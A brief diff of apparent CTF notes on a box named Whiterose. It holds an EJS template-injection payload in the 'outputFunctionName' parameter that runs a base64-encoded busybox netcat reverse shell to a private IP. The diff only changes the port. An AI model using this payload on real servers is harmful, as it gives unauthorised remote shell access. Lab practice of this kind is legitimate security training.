@@ -191,7 +191,7 @@ Jemmy Laurel:
 	- FUCK YESSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
 - lets get a revshell
 ```js
-&settings[view%20options][outputFunctionName]=x%3bprocess.mainModule.require('child_process').execSync('bash -c "echo YnVzeWJveCBuYyAxMC4yMS4xNTQuMTQ1IDEzMzcgLWUgc2g= | base64 -d | bash"');//
+&settings[view%20options][outputFunctionName]=x%3bprocess.mainModule.require('child_process').execSync('bash -c "echo YnVzeWJveCBuYyAxMC4yMS4xNTQuMTQ1IDEzMzggLWUgc2g= | base64 -d | bash"');//
 ```
 - HELLLLLLLLLLLLLLLLLLLL YEEAAAAAAAAAHHHHHHHHHHHH <br>
 ![[WhiteroseGotShell.png]] <br>
